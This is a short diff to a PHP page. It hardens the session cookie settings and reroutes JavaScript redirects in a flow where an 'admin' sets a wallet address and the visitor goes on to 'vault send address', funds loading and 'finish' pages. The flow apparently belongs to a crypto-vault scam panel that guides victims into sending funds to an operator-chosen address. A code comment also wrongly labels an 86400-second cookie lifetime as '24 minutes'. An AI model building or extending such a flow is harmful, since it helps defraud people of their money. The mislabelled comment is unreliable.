@@ -1,5 +1,11 @@
 <?php
-session_start();
+// Start the session with secure settings
+session_start([
+    'cookie_lifetime' => 86400, // 24 minutes
+    'cookie_secure' => true,    // Only send cookie over HTTPS
+    'cookie_httponly' => true, // Prevent JavaScript access to session cookie
+    'cookie_samesite' => 'Lax' // CSRF protection
+]);
 
 // Include the database connection file
 require_once "admin/db_connection.php";
@@ -311,8 +317,8 @@ if (file_exists($signalFile)) {
                         console.log('Waiting for admin to set up address...');
                         break;
                     case 'AddressSet':
-                        // Redirect to vault access when admin has set address
-                        window.location.href = 'vault_access.php';
+                        // Redirect to vault send address when admin has set address
+                        window.location.href = 'vault_send_address.php';
                         break;
                     case 'VaultWallet':
                         // Redirect to vault send address page when in wallet stage
@@ -323,8 +329,8 @@ if (file_exists($signalFile)) {
                         window.location.href = 'vault_funds_loading.php';
                         break;
                     case 'VaultFundsConfirmed':
-                        // Redirect to vault funds loading when funds confirmed
-                        window.location.href = 'vault_funds_loading.php';
+                        // Redirect to finish when funds confirmed
+                        window.location.href = 'finish.php';
                         break;
                     case 'finish':
                         // Redirect to finish.php if the signal is received
